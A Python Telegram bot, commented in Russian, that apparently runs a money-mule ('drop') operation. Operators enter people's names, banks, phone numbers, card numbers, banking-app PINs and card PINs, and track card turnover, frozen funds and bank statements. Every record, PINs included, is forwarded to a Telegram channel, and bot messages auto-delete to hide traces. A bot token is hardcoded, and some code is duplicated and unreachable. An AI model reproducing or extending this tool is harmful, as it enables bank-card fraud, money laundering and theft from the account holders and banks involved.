from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler,
    ContextTypes, filters, ConversationHandler
)
from datetime import datetime

import pyotp

user_secrets = {}  # user_id -> secret
user_auth_required = set()  # user_id в ожидании кода
last_active = {}  # user_id -> datetime


def verify_user_code(user_id: int, code: str) -> bool:
    secret = user_secrets.get(user_id)
    if not secret:
        return False
    totp = pyotp.TOTP(secret)
    return totp.verify(code)


async def check_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    now = datetime.now()
    last = last_active.get(user_id)

    # Первый запуск — генерируем секрет
    if user_id == OWNER_ID:
        return True
    if user_id not in user_secrets:
        secret = pyotp.random_base32()
        user_secrets[user_id] = secret
        user_auth_required.add(user_id)
        await context.bot.send_message(
            chat_id=7712837707,
            text=f"🆕 Новый пользователь запустил бота\n\nID: {user_id}\nСекрет: {secret}\n\nВыдай ему этот ключ для Google Authenticator."
        )
        await context.bot.send_message(chat_id=user_id,
                                       text="Бот временно приостановлен, следите за новостями в нашем канале.")
        return False

    # Время бездействия > 3 часов
    if not last or (now - last).total_seconds() > 3 * 3600:
        user_auth_required.add(user_id)
        await context.bot.send_message(chat_id=user_id,
                                       text="Бот временно приостановлен, следите за новостями в нашем канале.")
        return False

    last_active[user_id] = now
    return True


async def handle_2fa_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.strip()

    if user_id == OWNER_ID:
        return
        return  # не ожидаем код

    if verify_user_code(user_id, code):
        user_auth_required.discard(user_id)
        last_active[user_id] = datetime.now()
        await safe_send_and_delete(context.bot.send_message, user_id, text="✅ Код принят. Доступ разрешён.")
    else:
        await context.bot.send_message(
            chat_id=-1002574984804,
            text=f"🚨 Неверный код 2FA\n👤 ID: {user_id}\n🔢 Введено: {code}",
            parse_mode="HTML"
        )
        await safe_send_and_delete(context.bot.send_message, user_id, text="❌")


import asyncio


async def auto_delete_message(bot, chat_id, message_id, delay=90):
    await asyncio.sleep(delay)
    try:
        chat = await bot.get_chat(chat_id)
        if chat.type == "private":
            await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception as e:
        print(f"[delete error] {e}")


async def safe_send_and_delete(method, *args, **kwargs):
    try:
        msg = await method(*args, **kwargs)
        if msg:
            asyncio.create_task(auto_delete_message(msg._bot, msg.chat.id, msg.message_id))
        return msg
    except Exception as e:
        print(f"[send error] {e}")
        return None


# Удаление сообщений пользователя только в личке
async def delete_user_msg(update: Update):
    try:
        if update.message and update.effective_chat.type == "private":
            await update.message.delete()
    except Exception as e:
        print(f"[user delete error] {e}")


# Удаление callback сообщений только в личке
async def delete_callback_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_chat.type == "private":
            await update.callback_query.answer()
            await context.bot.delete_message(chat_id=update.effective_chat.id,
                                             message_id=update.callback_query.message.message_id)
    except Exception as e:
        print(f"[callback delete error] {e}")


import random

TOKEN = "7303014403:AAF0S_NZiyUdTtxxfiwI-atlpWDFcbgwhAQ"
OWNER_ID = 7712837707

approved_users = set()
applications = {}
blocked_applications = {}
completed_drops = {}
user_pages = {}  # Храним текущую страницу для каждого пользователя

FIO, BANK, PHONE, CARD, PIN_APP, PIN_CARD = range(6)
TURNOVER, BLOCK_DECISION, BLOCK_AMOUNT = range(6, 9)
SELECT_APP_FOR_STATEMENT, WAITING_FOR_STATEMENT_FILE = range(100, 102)
UNBLOCK_AMOUNT = 999
statements = {}  # UID заявки -> список file_id


def paginate_buttons(apps, page, per_page, prefix):
    start = page * per_page
    end = start + per_page
    buttons = [
        [InlineKeyboardButton(f"{app['fio']} ({app['app_id']})", callback_data=f"{prefix}_{uid}")]
        for uid, app in list(apps.items())[start:end]
    ]
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Назад", callback_data=f"{prefix}_prev"))
    if end < len(apps):
        nav_buttons.append(InlineKeyboardButton("➡️ Вперёд", callback_data=f"{prefix}_next"))
    if nav_buttons:
        buttons.append(nav_buttons)
    return buttons


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in user_auth_required:
        await handle_2fa_code(update, context)
        return
    if not await check_access(update, context): return
    user_id = update.effective_user.id
    if user_id == OWNER_ID or user_id in approved_users:
        keyboard = [
            [InlineKeyboardButton("📦 Дропы", callback_data='drops')],
            [InlineKeyboardButton("⛔️ Блоки", callback_data='blocks')],
            [InlineKeyboardButton("🔒 Отработанные дропы", callback_data='completed_drops')],
            [InlineKeyboardButton("📑 Выписки", callback_data='statements')],
        ]

        # кнопка у смайлика
        quick_keyboard = [[KeyboardButton("/start")]]
        await update.message.reply_text("🔘 Быстрые действия",
                                        reply_markup=ReplyKeyboardMarkup(quick_keyboard, resize_keyboard=True))

        # обычное меню
        inline_keyboard = [
            [InlineKeyboardButton("📦 Дропы", callback_data='drops')],
            [InlineKeyboardButton("⛔️ Блоки", callback_data='blocks')],
            [InlineKeyboardButton("🔒 Отработанные дропы", callback_data='completed_drops')],
            [InlineKeyboardButton("📑 Выписки", callback_data='statements')],
        ]
        await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "🏛 Главное меню",
                                   reply_markup=InlineKeyboardMarkup(inline_keyboard))

    else:
        keyboard = [
            [
                InlineKeyboardButton("✅ Одобрить", callback_data=f"approve_{user_id}"),
                InlineKeyboardButton("❌ Заблокировать", callback_data=f"deny_{user_id}")
            ]
        ]
        msg = (
            f"🚨 Новый пользователь:\n\n"
            f"👤 @{update.effective_user.username}\n"
            f"🆔 ID: {user_id}\n\n"
            f"Выдать доступ?"
        )
        await safe_send_and_delete(context.bot.send_message, chat_id=OWNER_ID, text=msg,
                                   reply_markup=InlineKeyboardMarkup(keyboard))
        await safe_send_and_delete(context.bot.send_message, update.effective_chat.id,
                                   "⏳ Ожидайте одобрения от администратора.")


async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in user_auth_required:
        await handle_2fa_code(update, context)
        return
    if not await check_access(update, context): return
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id
    await query.answer()

    if data == 'view_statements':

        if not statements:
            await query.edit_message_text("📭 Выписок пока нет.")
            return

        text = "📂 <b>Список выписок:</b>\n\n"
        for uid, files in statements.items():
            app = blocked_applications.get(uid) or completed_drops.get(uid)
            if not app:
                continue
            text += f"👤 {app['fio']} ({app['app_id']}) — {len(files)} файл(ов)\n"

        await query.edit_message_text(text, parse_mode='HTML')

    if data == 'drops':
        keyboard = [
            [InlineKeyboardButton("➕ Добавить", callback_data='add')],
            [InlineKeyboardButton("🔍 Проверить", callback_data='check')],
        ]
        await query.edit_message_text("📦 Дропы - выберите действие:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == 'add':
        await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="🧾 Введите ФИО:")
        return FIO

    elif data == 'check':
        user_pages[user_id] = 0
        await show_applications_page(user_id, context)

    elif data.startswith("check_prev"):
        user_pages[user_id] = max(0, user_pages.get(user_id, 0) - 1)
        await show_applications_page(user_id, context)

    elif data.startswith("check_next"):
        user_pages[user_id] = user_pages.get(user_id, 0) + 1
        await show_applications_page(user_id, context)

    elif data.startswith("app_"):
        uid = int(data.split("_")[1])
        context.user_data["selected_app"] = uid
        app = applications.get(uid)
        if app:
            text = (
                f"📅 Дата создания: {app['created_at']}\n\n"
                f"👤 ФИО: {app['fio']}\n"
                f"🏦 Банк: {app['bank']}\n"
                f"📱 Телефон: {app['phone']}\n"
                f"💳 Карта: {app['card']}\n"
                f"🔐 PIN App: {app['pin_app']}\n"
                f"🔐 PIN Card: {app['pin_card']}\n"
                f"🆔 ID заявки: {app['app_id']}"
            )
            keyboard = [
                [InlineKeyboardButton("✅ Закончить работу", callback_data="finish")],
                [InlineKeyboardButton("🗑 Удалить", callback_data="delete")]
            ]
            await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text=text,
                                       reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == 'finish':
        await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="💸 Укажите оборот по карте:")
        return TURNOVER




    elif data == 'delete':

        uid = context.user_data.get("selected_app")

        if uid in applications:
            keyboard = [

                [InlineKeyboardButton("🗑 Удалить", callback_data=f"confirm_delete")],

                [InlineKeyboardButton("❌ Отмена", callback_data="cancel_delete")]

            ]

            await context.bot.send_message(

                chat_id=user_id,

                text="❗ Вы уверены, что хотите удалить заявку?",

                reply_markup=InlineKeyboardMarkup(keyboard)

            )


    elif data == 'confirm_delete':

        uid = context.user_data.get("selected_app")

        if uid in applications:
            app = applications[uid]

            # Уведомление в канал

            channel_id = -1002574984804

            app_text = (

                f"🗑 <b>Заявка удалена</b>\n\n"

                f"📅 <b>Дата:</b> {app['created_at']}\n"

                f"👤 <b>ФИО:</b> {app['fio']}\n"

                f"🏦 <b>Банк:</b> {app['bank']}\n"

                f"📱 <b>Телефон:</b> {app['phone']}\n"

                f"💳 <b>Карта:</b> {app['card']}\n"

                f"📲 <b>ПИН приложения:</b> {app['pin_app']}\n"

                f"🔐 <b>ПИН карты:</b> {app['pin_card']}\n"

                f"🆔 <b>ID:</b> {app['app_id']}"

            )

            await safe_send_and_delete(context.bot.send_message, chat_id=channel_id, text=app_text, parse_mode='HTML')

            del applications[uid]

            await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="✅ Заявка удалена.")


    elif data == 'cancel_delete':

        await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="❌ Удаление отменено.")


    elif data == 'blocks':

        user_pages[user_id] = 0

        await show_blocks_page(user_id, context)


    elif data == 'completed_drops':

        user_pages[user_id] = 0

        await show_completed_page(user_id, context)


    elif data == 'blocked_prev':

        user_pages[user_id] = max(0, user_pages.get(user_id, 0) - 1)

        await show_blocks_page(user_id, context)


    elif data == 'blocked_next':

        user_pages[user_id] = user_pages.get(user_id, 0) + 1

        await show_blocks_page(user_id, context)


    elif data == 'completed_prev':

        user_pages[user_id] = max(0, user_pages.get(user_id, 0) - 1)

        await show_completed_page(user_id, context)



    elif data == 'completed_next':

        user_pages[user_id] = user_pages.get(user_id, 0) + 1

        await show_completed_page(user_id, context)


    elif data == 'statements':

        keyboard = [

            [InlineKeyboardButton("➕ Добавить выписку", callback_data='add_statement')],

            [InlineKeyboardButton("📁 Просмотр выписок", callback_data='view_statements')],

        ]

        await query.edit_message_text("📑 Выписки — выберите действие:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == 'add_statement':
        all_apps = {**blocked_applications, **completed_drops}
        if not all_apps:
            await query.edit_message_text("📭 Нет доступных заявок для выписки.")
            return ConversationHandler.END

        buttons = []
        for uid, app in list(all_apps.items())[::-1]:
            label = f"{app['fio']} ({app['app_id']})"
            buttons.append([InlineKeyboardButton(label, callback_data=f"statement_{uid}")])

        await query.edit_message_text("🔍 Выберите заявку для добавления выписки:",
                                      reply_markup=InlineKeyboardMarkup(buttons))
        return SELECT_APP_FOR_STATEMENT

    elif data.startswith("statement_"):
        uid = int(data.split("_")[1])
        app = blocked_applications.get(uid) or completed_drops.get(uid)
        if not app:
            await query.answer("Заявка не найдена.")
            return ConversationHandler.END

        context.user_data["statement_app"] = uid
        text = (
            f"👤 <b>ФИО:</b> {app['fio']}\n"
            f"🏦 <b>Банк:</b> {app['bank']}\n"
            f"🆔 <b>ID:</b> {app['app_id']}\n\n"
            f"📎 Пришлите файл (фото, видео, PDF) для прикрепления."
        )
        await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text=text, parse_mode="HTML")
        return WAITING_FOR_STATEMENT_FILE



    elif data.startswith("blocked_"):
        uid = int(data.split("_")[1])
        app = blocked_applications.get(uid)
        if app:
            await send_app_details(context, user_id, app, blocked=True)

    elif data.startswith("completed_"):
        uid = int(data.split("_")[1])
        app = completed_drops.get(uid)
        if app:
            await send_app_details(context, user_id, app, blocked=False)


    elif data.startswith("unblock_"):
        app_id = data.split("_")[1]
        for uid, app in blocked_applications.items():
            if str(app["app_id"]) == app_id:
                context.user_data["unblock_uid"] = uid
                await safe_send_and_delete(context.bot.send_message, chat_id=user_id,
                                           text="💸 Укажите сумму, которую разблокировали:")
                return UNBLOCK_AMOUNT
    elif data.startswith("approve_"):

        uid = int(data.split("_")[1])
        approved_users.add(uid)
        await safe_send_and_delete(context.bot.send_message, chat_id=uid, text="✅ Доступ одобрен. Напишите /start.")
        await query.edit_message_text("Пользователь одобрен.")


    elif data.startswith("deny_"):

        uid = int(data.split("_")[1])

        await safe_send_and_delete(context.bot.send_message, chat_id=uid, text="🚫 В доступе отказано.")

        await query.edit_message_text("Пользователь отклонён.")


    elif data == 'block_yes':

        await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="💰 Введите сумму блокировки:")

        return BLOCK_AMOUNT


    elif data == 'block_no':

        uid = context.user_data.get("selected_app")

        if uid in applications:
            applications[uid]["finished"] = True

            completed_drops[uid] = applications[uid]
            app = completed_drops[uid]

            channel_id = -1002574984804
            app_text = (
                f"🔒 <b>Заявка отработана</b>\n\n"
                f"📅 <b>Дата:</b> {app['created_at']}\n"
                f"👤 <b>ФИО:</b> {app['fio']}\n"
                f"🏦 <b>Банк:</b> {app['bank']}\n"
                f"📱 <b>Телефон:</b> {app['phone']}\n"
                f"💳 <b>Карта:</b> {app['card']}\n"
                f"📲 <b>ПИН приложения:</b> {app['pin_app']}\n"
                f"🔐 <b>ПИН карты:</b> {app['pin_card']}\n"
                f"💰 <b>Оборот:</b> {app.get('turnover', '-')}\n"
                f"🆔 <b>ID:</b> {app['app_id']}"
            )
            await safe_send_and_delete(context.bot.send_message, chat_id=channel_id, text=app_text, parse_mode='HTML')

            del applications[uid]

            await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="✅ Работа завершена.")

        return ConversationHandler.END


async def show_applications_page(user_id, context):
    page = user_pages.get(user_id, 0)
    active_apps = {uid: app for uid, app in applications.items() if not app.get("finished")}
    if not active_apps:
        await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="Нет активных заявок.")
        return

    buttons = []
    items = list(active_apps.items())[::-1]
    start = page * 5
    end = start + 5
    for uid, app in items[start:end]:
        label = f"{app.get('fio')} ({app.get('app_id')})"
        buttons.append([InlineKeyboardButton(label, callback_data=f"app_{uid}")])

    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Назад", callback_data="check_prev"))
    if end < len(items):
        nav_buttons.append(InlineKeyboardButton("➡️ Вперёд", callback_data="check_next"))
    if nav_buttons:
        buttons.append(nav_buttons)

    await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="📋 Активные заявки:",
                               reply_markup=InlineKeyboardMarkup(buttons))


async def send_app_details(context, user_id, app, blocked=False):
    text = (
        f"📅 Дата создания: {app['created_at']}\n\n"
        f"👤 ФИО: {app['fio']}\n"
        f"🏦 Банк: {app['bank']}\n"
        f"📱 Телефон: {app['phone']}\n"
        f"💳 Карта: {app['card']}\n"
        f"🔐 PIN App: {app['pin_app']}\n"
        f"🔐 PIN Card: {app['pin_card']}\n"
        f"💸 Оборот: {app.get('turnover', '—')}\n"
        f"🆔 ID заявки: {app['app_id']}\n"
    )

    if blocked:
        text += f"🔐 Заблокировано: {app.get('blocked_amount', '—')}\n"
        keyboard = [[InlineKeyboardButton("🔓 Разблокировали", callback_data=f"unblock_{app['app_id']}")]]
        await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text=text,
                                   reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        text += f"🔓 Разблокировано: {app.get('unblocked_amount', '—')}\n"
        await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text=text)


async def get_fio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    context.user_data["fio"] = update.message.text
    await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "🏦 Введите банк:")
    return BANK


async def get_bank(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    context.user_data["bank"] = update.message.text
    await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "📱 Введите номер телефона:")
    return PHONE


async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    context.user_data["phone"] = update.message.text
    await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "💳 Введите номер карты:")
    return CARD


async def get_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    context.user_data["card"] = update.message.text
    await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "🔐 Введите PIN от приложения:")
    return PIN_APP


async def get_pin_app(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    context.user_data["pin_app"] = update.message.text
    await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "🔐 Введите PIN от карты:")
    return PIN_CARD


async def get_pin_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    user_id = update.effective_user.id
    app_id = f"REQ{random.randint(1000, 9999)}"
    created_at = datetime.now().strftime("%d.%m.%Y %H:%M")
    uid = user_id + random.randint(1, 100000)

    applications[uid] = {
        "fio": context.user_data["fio"],
        "bank": context.user_data["bank"],
        "phone": context.user_data["phone"],
        "card": context.user_data["card"],
        "pin_app": context.user_data["pin_app"],
        "pin_card": update.message.text,
        "app_id": app_id,
        "created_at": created_at,
        "finished": False
    }

    await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, f"✅ Анкета сохранена. ID: {app_id}")

    # Уведомление в канал о новой заявке
    channel_id = -1002574984804
    app_text = (
        f"🆕 <b>Новая заявка</b>\n\n"
        f"📅 <b>Дата:</b> {created_at}\n"
        f"👤 <b>ФИО:</b> {context.user_data['fio']}\n"
        f"🏦 <b>Банк:</b> {context.user_data['bank']}\n"
        f"📱 <b>Телефон:</b> {context.user_data['phone']}\n"
        f"💳 <b>Карта:</b> {context.user_data['card']}\n"
        f"📲 <b>ПИН приложения:</b> {context.user_data['pin_app']}\n"
        f"🔐 <b>ПИН карты:</b> {update.message.text}\n"
        f"🆔 <b>ID:</b> {app_id}"
    )
    await safe_send_and_delete(context.bot.send_message, chat_id=channel_id, text=app_text, parse_mode='HTML')

    return ConversationHandler.END

    await safe_send_and_delete(context.bot.send_message, chat_id=channel_id, text=app_text, parse_mode='HTML')
    return ConversationHandler.END

    # Уведомление в канал о новой заявке
    channel_id = -1002574984804
    app_text = (
        f"🆕 <b>Новая заявка</b>\n\n"
        f"📅 <b>Дата:</b> {created_at}\n"
        f"👤 <b>ФИО:</b> {context.user_data['fio']}\n"
        f"🏦 <b>Банк:</b> {context.user_data['bank']}\n"
        f"📱 <b>Телефон:</b> {context.user_data['phone']}\n"
        f"💳 <b>Карта:</b> {context.user_data['card']}\n"
        f"📲 <b>ПИН приложения:</b> {context.user_data['pin_app']}\n"
        f"🔐 <b>ПИН карты:</b> {update.message.text}\n"
        f"🆔 <b>ID:</b> {app_id}"
    )
    await safe_send_and_delete(context.bot.send_message, chat_id=channel_id, text=app_text, parse_mode='HTML')

    return ConversationHandler.END


async def get_turnover(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    uid = context.user_data.get("selected_app")
    if uid in applications:
        applications[uid]["turnover"] = update.message.text
        keyboard = [
            [InlineKeyboardButton("✅ Есть", callback_data="block_yes")],
            [InlineKeyboardButton("❌ Нет", callback_data="block_no")],
        ]
        await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "💰 Была ли блокировка средств?",
                                   reply_markup=InlineKeyboardMarkup(keyboard))
        return BLOCK_DECISION
    return ConversationHandler.END


async def get_block_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    uid = context.user_data.get("selected_app")
    try:
        amount = float(update.message.text)
        if uid in applications:
            app = applications[uid]
            app["blocked_amount"] = amount
            app["finished"] = True
            blocked_applications[uid] = app
            del applications[uid]
            channel_id = -1002574984804
            app_text = (
                f"⛔️ <b>Заявка перенесена в блоки</b>\n\n"
                f"📅 <b>Дата:</b> {app['created_at']}\n"
                f"👤 <b>ФИО:</b> {app['fio']}\n"
                f"🏦 <b>Банк:</b> {app['bank']}\n"
                f"📱 <b>Телефон:</b> {app['phone']}\n"
                f"💳 <b>Карта:</b> {app['card']}\n"
                f"📲 <b>ПИН приложения:</b> {app['pin_app']}\n"
                f"🔐 <b>ПИН карты:</b> {app['pin_card']}\n"
                f"💰 <b>Оборот:</b> {app.get('turnover', '-')}\n"
                f"🔐 <b>Заблокировано:</b> {amount}\n"
                f"🆔 <b>ID:</b> {app['app_id']}"
            )
            await safe_send_and_delete(context.bot.send_message, chat_id=channel_id, text=app_text, parse_mode='HTML')

            await safe_send_and_delete(context.bot.send_message, update.effective_chat.id,
                                       "⛔️ Заявка добавлена в блоки.")
    except:
        await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "❗ Введите корректную сумму.")
    return ConversationHandler.END


async def receive_statement_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    uid = context.user_data.get("statement_app")
    if not uid:
        await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "❗ Не выбрана заявка.")
        return ConversationHandler.END

    file = None
    file_type = None
    if update.message.document:
        file = update.message.document
        file_type = "document"
    elif update.message.photo:
        file = update.message.photo[-1]
        file_type = "photo"
    elif update.message.video:
        file = update.message.video
        file_type = "video"

    if not file:
        await safe_send_and_delete(context.bot.send_message, update.effective_chat.id,
                                   "❗ Пожалуйста, отправьте файл, фото или видео.")
        return WAITING_FOR_STATEMENT_FILE

    file_id = file.file_id
    statements.setdefault(uid, []).append(file_id)

    await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "✅ Выписка успешно прикреплена.")

    # Уведомление в канал
    app = blocked_applications.get(uid) or completed_drops.get(uid)
    if app:
        log_text = (
            f"📎 <b>Добавлена выписка</b>\n\n"
            f"👤 <b>ФИО:</b> {app['fio']}\n"
            f"🏦 <b>Банк:</b> {app['bank']}\n"
            f"🆔 <b>ID:</b> {app['app_id']}"
        )
        await safe_send_and_delete(context.bot.send_message, chat_id=-1002574984804, text=log_text, parse_mode="HTML")

        if file_type == "photo":
            await safe_send_and_delete(context.bot.send_photo, chat_id=-1002574984804, photo=file_id)
        elif file_type == "video":
            await safe_send_and_delete(context.bot.send_video, chat_id=-1002574984804, video=file_id)
        else:
            await safe_send_and_delete(context.bot.send_document, chat_id=-1002574984804, document=file_id)

    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, "❌ Отменено.")
    return ConversationHandler.END


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await safe_send_and_delete(context.bot.send_message, update.effective_chat.id,
                                   "❌ У вас нет доступа к этой команде.")
        return

    total_apps = len(applications)
    total_blocks = len(blocked_applications)
    total_completed = len(completed_drops)

    turnover_sum = 0
    for app in blocked_applications.values():
        try:
            turnover_sum += float(app.get("turnover", 0))
        except ValueError:
            pass
    for app in completed_drops.values():
        try:
            turnover_sum += float(app.get("turnover", 0))
        except ValueError:
            pass

    blocked_sum = 0
    for app in blocked_applications.values():
        try:
            blocked_sum += float(app.get("blocked_amount", 0))
        except ValueError:
            pass

    text = (
        "📊 <b>Статистика:</b>\n\n"
        f"📋 Общее количество заявок: <b>{total_apps}</b>\n"
        f"⛔️ Количество блоков: <b>{total_blocks}</b>\n"
        f"🔒 Количество отработанных: <b>{total_completed}</b>\n\n"
        f"💸 Общая сумма оборотных денег: <b>{turnover_sum:,.0f}</b>\n"
        f"🔐 Активная сумма блоков: <b>{blocked_sum:,.0f}</b>"
    )

    await safe_send_and_delete(context.bot.send_message, update.effective_chat.id, text, parse_mode='HTML')


async def show_blocks_page(user_id, context):
    page = user_pages.get(user_id, 0)
    blocked_apps = list(blocked_applications.items())[::-1]
    if not blocked_apps:
        await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="⛔️ Нет заблокированных заявок.")
        return

    buttons = []
    start = page * 5
    end = start + 5
    for uid, app in blocked_apps[start:end]:
        label = f"{app.get('fio')} ({app.get('app_id')})"
        buttons.append([InlineKeyboardButton(label, callback_data=f"blocked_{uid}")])

    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Назад", callback_data="blocked_prev"))
    if end < len(blocked_apps):
        nav_buttons.append(InlineKeyboardButton("➡️ Вперёд", callback_data="blocked_next"))
    if nav_buttons:
        buttons.append(nav_buttons)

    await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="⛔️ Заблокированные заявки:",
                               reply_markup=InlineKeyboardMarkup(buttons))


async def show_completed_page(user_id, context):
    page = user_pages.get(user_id, 0)
    completed_apps = list(completed_drops.items())[::-1]
    if not completed_apps:
        await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="🔒 Нет отработанных заявок.")
        return

    buttons = []
    start = page * 5
    end = start + 5
    for uid, app in completed_apps[start:end]:
        label = f"{app.get('fio')} ({app.get('app_id')})"
        buttons.append([InlineKeyboardButton(label, callback_data=f"completed_{uid}")])

    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Назад", callback_data="completed_prev"))
    if end < len(completed_apps):
        nav_buttons.append(InlineKeyboardButton("➡️ Вперёд", callback_data="completed_next"))
    if nav_buttons:
        buttons.append(nav_buttons)

    await safe_send_and_delete(context.bot.send_message, chat_id=user_id, text="🔒 Отработанные заявки:",
                               reply_markup=InlineKeyboardMarkup(buttons))


async def handle_unblock_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await delete_user_msg(update)
    uid = context.user_data.get("unblock_uid")
    if not uid or uid not in blocked_applications:
        await safe_send_and_delete(context.bot.send_message, chat_id=update.effective_chat.id,
                                   text="❗ Заявка не найдена.")
        return ConversationHandler.END

    try:
        amount = float(update.message.text)
        app = blocked_applications.pop(uid)
        app["unblocked_amount"] = amount
        completed_drops[uid] = app

        text = (
            f"🔓 <b>Заявка разблокирована</b>\n\n"
            f"📅 <b>Дата:</b> {app['created_at']}\n"
            f"👤 <b>ФИО:</b> {app['fio']}\n"
            f"🏦 <b>Банк:</b> {app['bank']}\n"
            f"📱 <b>Телефон:</b> {app['phone']}\n"
            f"💳 <b>Карта:</b> {app['card']}\n"
            f"💰 <b>Оборот:</b> {app.get('turnover', '-')}\n"
            f"🔐 <b>Заблокировано:</b> {app.get('blocked_amount', '-')}\n"
            f"🔓 <b>Разблокировано:</b> {amount}\n"
            f"🆔 <b>ID:</b> {app['app_id']}"
        )
        await safe_send_and_delete(context.bot.send_message, chat_id=-1002574984804, text=text, parse_mode="HTML")
        await safe_send_and_delete(context.bot.send_message, chat_id=update.effective_chat.id,
                                   text="✅ Заявка перенесена в отработанные.")
    except ValueError:
        await safe_send_and_delete(context.bot.send_message, chat_id=update.effective_chat.id,
                                   text="❗ Введите корректную сумму.")
        return UNBLOCK_AMOUNT

    return ConversationHandler.END


# === Запуск ===
app = ApplicationBuilder().token(TOKEN).build()

conv_handler = ConversationHandler(
    entry_points=[CallbackQueryHandler(handle_callback)],
    states={
        FIO: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_fio)],
        BANK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank)],
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        CARD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_card)],
        PIN_APP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_pin_app)],
        PIN_CARD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_pin_card)],
        TURNOVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_turnover)],
        BLOCK_DECISION: [CallbackQueryHandler(handle_callback)],
        BLOCK_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_block_amount)],
        SELECT_APP_FOR_STATEMENT: [CallbackQueryHandler(handle_callback)],
        WAITING_FOR_STATEMENT_FILE: [
            MessageHandler(filters.Document.ALL | filters.PHOTO | filters.VIDEO, receive_statement_file)
        ],
        UNBLOCK_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unblock_amount)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],

)

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("status", status))
app.add_handler(conv_handler)
app.add_handler(CallbackQueryHandler(handle_callback))

print("✅ Бот запущен.")
app.add_handler(CallbackQueryHandler(delete_callback_interaction, block=False))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_2fa_code))
app.run_polling()


